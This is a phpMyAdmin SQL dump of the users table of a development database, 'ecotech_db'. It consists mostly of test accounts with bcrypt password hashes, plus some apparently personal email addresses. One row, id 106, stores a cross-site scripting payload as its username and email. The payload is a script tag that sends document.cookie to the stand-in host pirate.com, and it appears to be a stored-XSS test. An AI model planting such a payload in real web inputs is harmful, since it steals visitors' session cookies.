-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Hôte : 127.0.0.1:3306
-- Généré le : ven. 10 avr. 2026 à 13:14
-- Version du serveur : 9.1.0
-- Version de PHP : 8.3.14

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données : `ecotech_db`
--

-- --------------------------------------------------------

--
-- Structure de la table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` text NOT NULL,
  `email` text NOT NULL,
  `password` varchar(255) DEFAULT NULL,
  `merchant_id` int DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=115 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `users`
--

INSERT INTO `users` (`id`, `username`, `email`, `password`, `merchant_id`) VALUES
(1, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$7tuETLQxmnwrOPdsjWPU8eZ6umDgaw4Lx', NULL),
(2, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$wdC0jRGv5Jgmvxv6nqjri.evsE4DJ39UK', NULL),
(3, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$VqfZX6Ydvrnm54qTdB9qxuCVCjhv3wgZA', NULL),
(4, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$J04KM.V9j8u2WzxrXTCbkOGDx52XQ32u4', NULL),
(5, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$BaQg2ij6M8FAzQthRi9mkuY0bK//FYJ8N', NULL),
(6, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$zmqGvLfOFUq8A1SRQlCe/eIATi8g63l2g', NULL),
(7, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$ijUop5z5UxBx8k0e12sHFe36JNICUblGd', NULL),
(8, 'ezechiel@gmail', 'ezechiel@gmail.com', '$2y$10$ak4PLBQcKsv4EMX8eWhtwezBP9AU4Xt0L', NULL),
(9, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$M5i70ovJC7ur2XZi24116.OPAgka2ZO.x', NULL),
(10, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$7bS8m6e0/4I0f9KnjE3Kt./CoXhShYff0', NULL),
(11, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$n8lQ2.p5NAxxiUVRY.nodOZDjLaQ1.v4P', NULL),
(12, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$ONGWcNTB1SE9O90hU62WLe/dYk7g8g5vH', NULL),
(97, 'naruto', 'naruto@gmail.com', '$2y$10$KHZv3CLCoG9PlZrnuh9v5eWpElaVscKe.zQf8eQjEFnGs..DwbS7C', NULL),
(14, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$sGAj8xyjpCVrA2xktN1zk.ReXsBiCvSjW', NULL),
(15, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$GGpcVXMZyNxhUPMJAlA5C.uUcSiY4fN87', NULL),
(16, 'ezechiel@gmail', 'TESTE@seyrinsecuresyssys.com', '$2y$10$fUujWz2.nHxpowh3NUq64.9bCvTyR1jEv', NULL),
(17, 'ezechiel@gmail', 'kouakouezechielk06@gmail.com', '$2y$10$bmLy8c1zt2J4l.KZL6GdMeT2TbRluLeS0', NULL),
(18, 'teste', 'test@gmail.com', '$2y$10$qBKcA4fzxAiZc5ksKWkyOeZ7aCJPmxbW9', NULL),
(19, 'ezechiel@gmail.com', 'test', '$2y$10$SrpmEapAzbp4GDCvrBPvUOIys41iYvJFI', NULL),
(20, 'test@gmail.com', 'test', '$2y$10$Fbqptztrgki1vG0h6MQbO.gM8CFjLFy8DR7k0BdDitljp7Pkle.ei', NULL),
(21, 'test@gmail.com', 'test', '$2y$10$oy2KkloNj/4D.fhIHXeEju2EIHlsl4bb/V0Yy.0hhpMrsgc8XL2UO', NULL),
(22, 'test@gmail.com', 'test', '$2y$10$nUMbwFhY6HfJFAAjtD.nfuxLrvumBdDfYEL0UW4ry21PY69fNqQKa', NULL),
(23, 'test1@gmail.com', 'test1', '$2y$10$DOMxvIJYaRZDALzHC63.GehMrebdQTthwbRNElQXN2p5i2TyjNXBm', NULL),
(24, 'test2@gmail.com', 'test', '$2y$10$iOvxJ/XdWUftOP6YvOAM3OV4AhdRmlhFk7oqHzLD3YJckIcDk96zy', NULL),
(25, 'hello', 'hello1@gmail.com', '$2y$10$MpICVLFRRTZmnciWLChTo.CpAa2a2gNaIMBDAFVGb3u/57wuPkS7a', NULL),
(26, 'hello1@gmail.com', 'TESTE@seyrinsecuresyssys.com', '$2y$10$GYyuNohQnXiaLJWLVV/2Jexkv6EK511uB/I0Wyk3rbjDSumPCA4ne', NULL),
(27, 'hello1@gmail.com', 'kouakouezechielk06@gmail.com', '$2y$10$5wuiPEdS2Rb.PkPMOSj/XuhhRHrMTtSgY54Hm6s7SOABbJYyMaG4i', NULL),
(28, 'hello', 'hello3@gmail.com ', '$2y$10$VC9nA8MWtMnudJnRMcAHXeNWSiAORfQsQngGTEW.2dzzmgooKlMnC', NULL),
(29, 'hello', 'hello3@gmail.com', '$2y$10$zdNSil684I85H4i3JXGL.e26SHBN35woj5bhR1ioQnzsdy45Je4hS', NULL),
(30, 'john', 'john@gmail.com', '$2y$10$Gky7pBhGsBeZZleqQSgy0erfhOubZTQb6JzS8FXcRMQmXFgmTii9y', NULL),
(31, 'hello1@gmail.com', 'kouakouezechielk06@gmail.com', '$2y$10$cez0u4hVTGBadfH0avz6KuJxza6.owoy71dbNNmfriw9bqyB6a2z2', NULL),
(32, 'user1', 'user1@gmail.com', '$2y$10$w5b42c5oPfzGgIaivPlVDetyXehWSoByKo/lUg9nW1GOXV1diTzAe', NULL),
(33, 'user2', 'user2@gmail.com', '$2y$10$7I4AAfSYEC9Mb841X3R8hO4/mrDyW.gPqlh9/7T/vUkEJfzz1jl6G', NULL),
(34, 'testeur', 'teste@gmail.com', '$2y$10$fvf/QN2V/HBahsxEVXhDP.r16WzBS2O4PXjhcBPvEoAOs0Gjof6bC', NULL),
(35, 'test', 'test1@gmail.com', '$2y$10$Q1YrO7tbQXvewYalUETU3utV3APQxAjj19N4Y5S4jMiLtdYVK7mwa', NULL),
(36, 'teste', 'test2@gmail.com', '$2y$10$vkTa98Z2UhjMfxW8v4A95ep5f1/cxt0Xri/ikFMuFoIwrHaX7f.82', NULL),
(37, 'teste', 'test3@gmai.com', '$2y$10$efA0QuYJx9WMQHEGJ4iI7OyJm/zxb6iuQSJ6eyV1OFg4MAdaEqbJa', NULL),
(38, 'test4', 'test4@gmail.com', '$2y$10$v9fISB38MKKWPHq64WKS2eOhoFbCeyra.vLJ34qsthih5toej5c4q', NULL),
(39, 'test5', 'test5@gmail.com', '$2y$10$DIU6HGim8Kl9.XC2K7ud2uka8jHXI63vJ1FepITAwIc02SOsfi3oK', NULL),
(40, 'test6', 'test6@gmail.com', '$2y$10$OdMfyJtuMq1kCS4eY.q7AOfkIZK1uvxhEJboZ4lEwNzc6TRoPaOM2', NULL),
(41, 'teste7', 'test7@gmail.com', '$2y$10$kPNE7LS8ZpgAmleQCkIF5us.US1MNW7wMOiIYXTBmgdvVfzgxC/te', NULL),
(42, 'test8', 'test8@gmail.com', '$2y$10$bWHcA0qbSWLPq5ajqw5RwuThE76BOslBPzknl2Rm3.WYsiXAfS/jy', NULL),
(43, 'test9', 'test9@gmail.com', '$2y$10$jX58xezadjnsTOO.RUm46.OV0u4Q8v3cELaiM3GRB4IGd2w27Wkt.', NULL),
(44, 'test10', 'test10@gmail.com', '$2y$10$4yT/g07b7tMIKGIWYzYh8OnCOQVuUHLGNTogPJ/lODTD8DX7mPJnO', NULL),
(45, 'test11', 'test11@gmail.com', '$2y$10$G.Odrhxae6a2NtpmtGT3Fen2UllFO5Z7Ncs24hmiGPAixuS23evES', NULL),
(46, 'test12', 'test12@gmail.com', '$2y$10$JInGQh0UVAGdPDnBNDfmhuLzzN.ed/GnKXdpZatyVM9oaFhyk9b5.', NULL),
(47, 'test13', 'test13@gmail.com', '$2y$10$3/1kwvW5J6zWYGnAuo.qeOXRP3M8UvGPsns2b46L1WMQMZRHNrf.2', NULL),
(48, 'test14', 'test14@gmail.com', '$2y$10$WYDYKPkzRuGrJKEcgB0Kh.RL12dxNWyTDX7KWRbr1Mg8zWcSDn0uu', NULL),
(49, 'test16', 'test16@gmail.com', '$2y$10$rNf8FUcGXtT1017HjOpNju1NjRA8yYGfLVIAPjeSQsG7.1V6I8W2G', NULL),
(50, 'test', 'test18@gmail.com', '$2y$10$7p1tc4FxNyKUyG0haSntIuvj9NUa.o3TkS2qIvDzByQFWpNRPfQHa', NULL),
(51, 'test19', 'test19@gmail.com', '$2y$10$sieOAiE4oUxx1bXK6s4oMeVDe1qgwrkEx5fBIfhiTUuLbShEqIHyy', NULL),
(52, 'Ezecheil Kouakou', 'eze@gmail.com', '$2y$10$5RTV/1naHdR3U8txJXqV7ulhsl3XHEIYHVGSTTzZK9.qFAJtwilvS', NULL),
(53, 'Ezechiel Kouakou', 'kk@gmail.com', '$2y$10$5RD5CAs7YowGz42NnWsXPOU46l2bYaDm1djUefiD8hxEFxz/SiQYe', NULL),
(54, 'test', 'test20@gmail.com', '$2y$10$F2lGApc6qe3mcFW0HSSAGu1pVnDaZqtYO7HrY9yyPQ1bwxBFyv69C', NULL),
(55, 'test', 'test21@gmail.com', '$2y$10$USpH8QehHqkp44yLWkHkoeWx037toYajLaXmVkRry0qLUEqvIQSza', NULL),
(56, 'Ezechiel ', 'kouakou@gmail.com', '$2y$10$7U9aCmIHkPl8klfMLge2O.C0SySyNWzegCJ1hlwDxS8Mwf5T64xOG', NULL),
(98, 'kouakou ezechiel ', 'ezechielkouakou@gmail.com', '$2y$10$ZzpJFiRkOonnDNEgvTbY5eOKhs2G7RiURq2sph5PW66qmYUpuj66m', NULL),
(58, 'hello1@gmail.com', 'hello32@gmail.com', '$2y$10$poIBZJicrlbEYzUfqs1JOuRqYSU7kGlX0ouO0CtJDzwe50t9hHKN2', NULL),
(59, 'hello1@gmail.com', 'hello42@gmail.com', '$2y$10$Zu23.fMg7pwoHtuTtVBekeRosEE3jKfswJJzx2ioddEeBir2PYs.G', NULL),
(60, 'hello1@gmail.com', 'heeloEZ@gmail.com', '$2y$10$XSOhXVuO.3g9ff8wffh4kO9FnLzZWoRdYLjB.NTYLz4IsaEPjcZRy', NULL),
(61, 'hello1@gmail.com', 'heelo12@gmail.com', '$2y$10$BIk/ZR5IrhXFw0bsuNKZ4.RIWMhahsJDUoLlvm2kQmHLiXs54NA/e', NULL),
(62, 'hello1@gmail.com', 'heelo@gmail.com', '$2y$10$mOcIGcMywmFSNocVnYXeg.3/Qi8MUfaJYvPVw5KYL5oUGycLU8a5a', NULL),
(63, 'hello1@gmail.com', 'heelo10@gmail.com', '$2y$10$evYZ78h7L6PPHf7wmFUmHeaEuaZFjtK8uFgk/JonfT94SuJJNtqo.', NULL),
(64, 'hello1@gmail.com', 'heelo@309gmail.com', '$2y$10$896/tYEgDbMg.7FLSqFPweQeFYK44H80Hbm7Au9LZrIgovGSLvUv6', NULL),
(65, 'hello ', 'kobon', '$2y$10$an2E.29Igw6PphjHRv/Pm.ppLk9HYqljLF5mZLpsuMa/xFww8OQwa', NULL),
(66, 'hello1@gmail.com', 'heelo96@gmail.com', '$2y$10$gpmZL03wLjYwtlDcSbPNzu6H4IPzjGGdKw0.vwQx5gi5i6NAualju', NULL),
(67, 'hello1@gmail.com', 'heelo60@gmail.com', '$2y$10$NQn1/.uPBINzJvZezumPRusiT0f/bNZ1fbzxs.NiFKxi05.RJ8J8e', NULL),
(68, 'user5', 'user5@gmail.com', '$2y$10$ZatigvE.7eI/DzBJWxpGx.S80fYT4nWdduzGKdsiyuLXbFY/5upIi', NULL),
(69, 'user6', 'user6@gmail.com', '$2y$10$Dud2N49wqv/sx518pdunhe5RWB6f3Qa6E/5D2TWGDyNFuCkcXjZn2', NULL),
(70, 'user7', 'user7@gmail.com', '$2y$10$5fGygl9D.YmVQexzQmZ2DuPkzhKH5aTHxca4ZjtwHgtfqXMEBCXZq', NULL),
(71, 'User8', 'user8@gmail.com', '$2y$10$POC.bm2exMb7ETGXaxJA7uJrsyZLAO/clEbOfudfwHk6GABWMvWL.', NULL),
(72, 'utilisateur1', 'utilisateur1@gmail.com', '$2y$10$cjnfROZFZMdUf3ME/XdLFuFvN.moYf8Ak4J4GweGngCQPJeGmLpEa', NULL),
(73, 'user5@gmail.com', 'g@g.com', '$2y$10$BFuRBpJ/X13v8jWOupbokOJbaueOtlmx3KYZo8rw6FaJj8E6UFzTy', NULL),
(74, 'user5@gmail.com', 'e@gmail.com', '$2y$10$XAxAn3ke7Y8NyH9kn2n3GeylSxBF87h2izpTQSNn7OtsukPjNexEO', NULL),
(75, 'user5@gmail.com', 'gg@gmail.com', '$2y$10$TlcvsbyFn5Jz3BbQd8tKBushM49eGIuVsLy/JlF/2p/pQ8046OLQy', NULL),
(76, 'user5@gmail.com', 'ggg@gmail.com', '$2y$10$aFLNvaBAlbLUeO/m15i93Og6o/P9kWKdz7jg.EM.5irszTYYbYqPS', NULL),
(77, 'user5@gmail.com', 'gggg@gmail.com', '$2y$10$iBMCoxnCL7aBm3arI.qRZOOzlJOdVj6Z0KlAS.THZ3M43BCWSSI4q', NULL),
(78, 'user5@gmail.com', 'll@gmail.com', '$2y$10$eevnL1tmhMhjeordO0FBFeX2N5HdJ2OajVxEvllas5d3p6SWQnGw2', NULL),
(79, 'user5@gmail.com', 'lll@gmail.com', '$2y$10$h4Fxhuld.5no2uD1cZSDbefVq9q2oqfVmtps6XJAgjb/Pi7qZ5ZVy', NULL),
(80, 'user5@gmail.com', 'test@gmail.com', '$2y$10$RHaWrbSqYrX8s9R9K5dkg.GSiKCXacgRLClNWDLhKmp4QA7rJQ3Ni', NULL),
(81, 'user5@gmail.com', 'test@gmail.com', '$2y$10$uqi5SaTBooP3cJIaBFw66.xfKrpGc3qV4evkfuoT1UcU83OlHNcjC', NULL),
(82, 'user5@gmail.com', 'test@gmail.com', '$2y$10$sFzg25G4SIebtzJ2VNt9AOtvfBqd19UGHQFM3zVpMQq1wiOvDY9eS', NULL),
(83, 'user5@gmail.com', 'test@gmail.com', '$2y$10$4iSk9GAZsUN0rQldPHw4IeunFNFPmGAhgPMgXll7uVP5mfa4lvyW2', NULL),
(84, 'user5@gmail.com', 'test@gmail.com', '$2y$10$SV4BSNN130JYv2pd6J6aeu.la.sphp1vmd7aXiDNUmOZc4pmzCvjm', NULL),
(85, 'user5@gmail.com', 'test@gmail.com', '$2y$10$V/BPKbNjyjj4qUGkSx2YGuoDeLudInyKFXsNXiKfc7L.AR4W1jPlu', NULL),
(86, 'Eze', 'eze@gmail.com', '$2y$10$95Y9/NIjyd8XPa8OF3Kw1uOi6dhNS0Mm0/imawkqYbDZOpxNlmAYC', NULL),
(87, 'testP', 'testP@gmail.com', '$2y$10$jbG1NR1F0t5LL6ZJBAi1uOc00AdbZv/bh8PPMh/Vye07GqbwQgHl.', NULL),
(88, 'test', 'test56@gmail.com', '$2y$10$UIvljWq09akhtn7k46wd3.RvK431ytkVcBVatSktodI1RbP7YEN3u', NULL),
(95, 'Eze', 'ezekk@gmail.com', '$2y$10$2v6b4DmWtjN7aaGzLs32/.8RP0vlEXLPoYsHTXeVjiXGJIMttKpWi', NULL),
(96, 'teste ', 'test@gmail.com', '$2y$10$kk.4SCFvX.VkvfofkH53i.MWRCkjDfRLHXGMoL2GVykbC8cuznKya', NULL),
(91, 'eze kouakou', 'eze5@gmail.com', '$2y$10$udJcy0eMc9U5/3OXzjhKeeezn9ONTDzziKYQ5ykud/w28CreewyGO', NULL),
(92, 'eze', 'eze3@gmail.com', '$2y$10$YZBCc/xxXM2vYasZy0GibuE.MoD1wGbGRcFGJiMQz2A51IPU7jnOS', NULL),
(93, 'Ezechiel kouakou', 'ezek@gmail.com', '$2y$10$x9DKZ5ADpnhU8uz9j2yRB.endVHJCaJHhF4aZpa33OXzQRUgwhwv.', NULL),
(94, 'ezechiel', 'ezechielk06@gmail.com', '$2y$10$LafZdkEonAbYepNQ5FO1NuBBf5G1q3E52gasR2.lxlbcKBkqTfpAa', NULL),
(99, 'ezechiel kouakou', 'ezechielkouakou06@gmail.com', '$2y$10$wf0EPv15p1rUuHw6ZY8xLuetPHQYKeEUE.6LVDisPQa6soHqoIAY6', NULL),
(100, 'Ezechiel', 'ezechielk06@gmail.com', '$2y$10$nIbvHZT0fkMnnxtigOvBJuD6GITm2iNlY8qJ6kOVT9.CLW2YQ0.pe', NULL),
(101, 'Ezechiel', 'ezechielk07@gmail.com', '$2y$10$JSPIOg1vQjU4mYUQ9skvre1lz890LUP34QjYEukZ9Ne/n5REBz0RS', NULL),
(102, 'Ecotech', 'usertest@gmail.com', '$2y$10$Inp.omsznh/W4k7yYLeLoO78hvMrXoEls5akzRDKa8bZaPVrWLDba', NULL),
(103, 'usertestFeed', 'usertestFeed@gmail.com', '$2y$10$ETTeYSyD/XCDwM7p/gAf9Og988XK3kopJT//vhJww7Jrxqc.BMwZy', NULL),
(104, 'naruto', 'naruto@gmail.com', '$2y$10$zun0sV5RjGqVv5suI9YKJurl.0HMwAYq7G0QeU2byrX9irQem.kty', NULL),
(105, 'userTest2', 'userTest2@gmail.com', '$2y$10$IRK5TCNfOy2COvGK6ZuJUej82hIJutxkWIpXYA5QKVX05.MOWm1w.', NULL),
(106, '<script>fetch(\'http://pirate.com?cookie=\' + document.cookie)</script>', '<script>fetch(\'http://pirate.com?cookie=\' + document.cookie)</script>', '$2y$10$KK0AGogiWOIuZlP3oQmdbea8ZOHZUgeRMicxsAwj1Mq.ciJl7NCbe', NULL),
(107, 'user8', 'user8@gmail.com', '$2y$10$3hKqmuUm3AiX/cuACUOVN.bYJcI6KsLbmyMN.rp7EO7ud7Wsi5npy', NULL),
(108, 'hello', 'user5@gmail.com', '$2y$10$A73LOulN7b7vC4mpPMCJfu71yNd0BJWMLj9b/EcwNIgd4jHyc/apK', 1),
(109, 'hello', 'user5@gmail.com', '$2y$10$VPUBB9DjC1DyadaieRF5vO7pHwOuYCBYmoKyVSbf7mE3C4b7mFhMG', 1),
(110, 'hello', 'user5@gmail.com', '$2y$10$UgvI2ePoEXXPdr9g7/LSQ.bAJrKdDTLwpE1t0LrGGFoPUhzmg8Kxu', 1),
(111, 'hello', 'user5@gmail.com', '$2y$10$Mjq7jKjx/RErNf8uOpIwneiuQUeAFtqSCEmLN03oIIbQjvSz4i3d2', 1),
(112, 'userSS', 'huser5@gmail.com', '$2y$10$8mAb76RS/hQOADv7GLrboeKZYpOZD3J.KxwQoLgYbrtYxAJDy3aLu', 3),
(113, 'Proatt', 'user5@gmail.com', '$2y$10$QQ9127vWSeeJfGbtd.rIW.gBje5oq9VmsHuwHhxuHJJjNXIz4msqq', 4),
(114, 'user5@gmail.com', 'kouakouezechielk06@gmail.com', '$2y$10$tuAQ7ztL/xYWppRGzseqHO1oRqYtALc8V6YqL2IgXnJqcpO5OBOvG', 4);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
